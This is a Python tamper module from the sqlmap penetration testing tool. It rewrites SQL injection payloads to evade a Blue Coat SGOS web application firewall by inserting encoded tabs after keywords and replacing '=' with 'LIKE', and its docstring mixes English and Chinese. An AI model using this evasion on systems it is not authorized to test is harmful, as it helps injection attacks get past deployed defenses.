#!/usr/bin/env python

"""
Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org)
See the file 'LICENSE' for copying permission
"""

import re

from lib.core.data import kb
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL

def dependencies():
    pass

def tamper(payload, **kwargs):
    "\n    Replaces the space following an SQL statement with a random valid blank character, then converts = to LIKE\n\n    Requirement:\n        * Blue Coat SGOS 已激活 WAF，如中所述\n        https://kb.bluecoat.com/index?page=content&id=FAQ2147\n\n    测试针对：\n        * MySQL 5.1、SGOS\n\n    Notes:\n        * 可用于绕过 Blue Coat 推荐的 WAF 规则配置\n\n    >>> tamper('SELECT id FROM users WHERE id = 1')\n    'SELECT%09id FROM%09users WHERE%09id LIKE 1'\n    "

    def process(match):
        word = match.group('word')
        if word.upper() in kb.keywords:
            return match.group().replace(word, "%s%%09" % word)
        else:
            return match.group()

    retVal = payload

    if payload:
        retVal = re.sub(r"\b(?P<word>[A-Z_]+)(?=[^\w(]|\Z)", process, retVal)
        retVal = re.sub(r"\s*=\s*", " LIKE ", retVal)
        retVal = retVal.replace("%09 ", "%09")

    return retVal
